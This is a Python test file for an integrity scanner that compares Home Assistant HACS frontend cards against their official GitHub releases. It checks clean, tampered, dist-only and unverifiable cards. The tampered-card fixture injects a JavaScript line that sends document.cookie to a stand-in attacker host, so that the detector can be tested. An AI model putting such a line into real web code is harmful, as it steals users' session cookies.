"""Integridade dos cards do HACS (www/community) contra a release oficial."""

from __future__ import annotations

import gzip
import json
from pathlib import Path

from auditor.config import Paths
from auditor.models import Severity
from auditor.scanners.integrity import IntegrityScanner

from .test_fase1 import RULES, FakeGitHub, _ctx, _tar_of

JS = b"class MeuCard extends HTMLElement {}\ncustomElements.define('meu-card', MeuCard);\n"


def _setup(tmp_path, files: dict[str, bytes], *, hacs=True, routes=None):
    config = tmp_path / "config"
    card = config / "www/community/meu-card"
    card.mkdir(parents=True)
    for rel, data in files.items():
        (card / rel).parent.mkdir(parents=True, exist_ok=True)
        (card / rel).write_bytes(data)
    if hacs:
        (config / ".storage").mkdir()
        (config / ".storage/hacs.repositories").write_text(json.dumps({"data": {"9": {
            "full_name": "dono/meu-card", "category": "plugin", "version_installed": "v2.0.0"}}}))
    data = tmp_path / "data"
    data.mkdir()
    default = {
        # O HACS baixou o anexo da release; o repositório tem o código-fonte em src/ e o build em dist/.
        "https://codeload.github.com/dono/meu-card/tar.gz/v2.0.0": _tar_of("meu-card-2.0.0", {
            "README.md": b"# Meu card\n", "src/meu-card.ts": b"// fonte\n", "dist/extra.js": b"// dist\n"}),
        "https://api.github.com/repos/dono/meu-card/releases/tags/v2.0.0": {
            "assets": [{"name": "meu-card.js", "browser_download_url": "https://github.com/dono/meu-card/meu-card.js"}]},
        "https://github.com/dono/meu-card/meu-card.js": JS,
    }
    gh = FakeGitHub(routes if routes is not None else default)
    return Paths(config_dir=config, data_dir=data, rules_dir=RULES), gh


async def _scan(paths, tmp_path, gh):
    ctx = _ctx(paths, tmp_path, http=gh)
    findings = await IntegrityScanner().scan(ctx)
    return findings, ctx.components[("frontend", "meu-card")].get("integridade")


async def test_clean_card_with_hacs_gz(tmp_path):
    paths, gh = _setup(tmp_path, {"meu-card.js": JS, "meu-card.js.gz": gzip.compress(JS), "extra.js": b"// dist\n"})
    findings, status = await _scan(paths, tmp_path, gh)
    assert findings == [] and status == "verificada contra dono/meu-card@v2.0.0"
    # Segunda varredura: cache, nenhum download novo.
    gh.calls.clear()
    assert (await _scan(paths, tmp_path, gh))[0] == [] and gh.calls == []


async def test_tampered_card_extra_files_and_gz(tmp_path):
    files = {
        "meu-card.js": JS + b"fetch('https://coleta.evil.xyz/?c=' + document.cookie);\n",
        "meu-card.js.gz": gzip.compress(JS + b"fetch('https://coleta.evil.xyz/?c=' + document.cookie);\n"),
        "extra.js": b"// dist\n",
        "extra.js.gz": gzip.compress(b"outro codigo\n"),  # .gz não bate com o .js: o HA serviria o .gz
        "loader.js": b"import('./x.js')\n",                 # não existe na release
        "logo.png": b"\x89PNG...",
    }
    paths, gh = _setup(tmp_path, files)
    findings, status = await _scan(paths, tmp_path, gh)
    by = {(f.rule_id, f.file.rsplit("/", 1)[-1]): f for f in findings}
    assert set(by) == {
        ("auditor.integridade.card-alterado", "meu-card.js"),
        ("auditor.integridade.card-gz-diferente", "extra.js.gz"),
        ("auditor.integridade.card-arquivo-extra", "loader.js"),
        ("auditor.integridade.card-arquivo-extra", "logo.png"),
    }
    assert "+fetch('https://coleta.evil.xyz" in by[("auditor.integridade.card-alterado", "meu-card.js")].snippet
    assert by[("auditor.integridade.card-arquivo-extra", "loader.js")].severity is Severity.HIGH
    assert by[("auditor.integridade.card-arquivo-extra", "logo.png")].severity is Severity.LOW
    assert status == "verificada contra dono/meu-card@v2.0.0 (4 diferença(s))"


async def test_card_from_dist_without_release(tmp_path):
    """Sem release (instalado por commit/tag sem anexos): compara com dist/ do repositório."""
    routes = {"https://codeload.github.com/dono/meu-card/tar.gz/v2.0.0": _tar_of("x", {"dist/meu-card.js": JS})}
    paths, gh = _setup(tmp_path, {"meu-card.js": JS}, routes=routes)
    findings, status = await _scan(paths, tmp_path, gh)
    assert findings == [] and status.startswith("verificada contra")


async def test_card_not_verifiable(tmp_path):
    paths, gh = _setup(tmp_path, {"meu-card.js": JS}, hacs=False)
    findings, status = await _scan(paths, tmp_path, gh)
    assert findings == [] and status == "não verificada: card sem registro no HACS" and gh.calls == []

    other = tmp_path / "outro"
    other.mkdir()
    paths, gh = _setup(other, {"meu-card.js": JS}, routes={})
    findings, status = await _scan(paths, other, gh)
    assert findings == [] and status.startswith("não verificada: nenhuma versão correspondente")


def test_www_rest_is_never_compared(tmp_path):
    """O resto de www/ (fotos e arquivos do usuário) não é card do HACS: fica fora da comparação."""
    from auditor.inventory import discover

    (tmp_path / "www").mkdir()
    (tmp_path / "www/foto.jpg").write_bytes(b"x")
    inv = discover(Path(tmp_path))
    assert [c.name for c in inv.frontend] == ["www"]
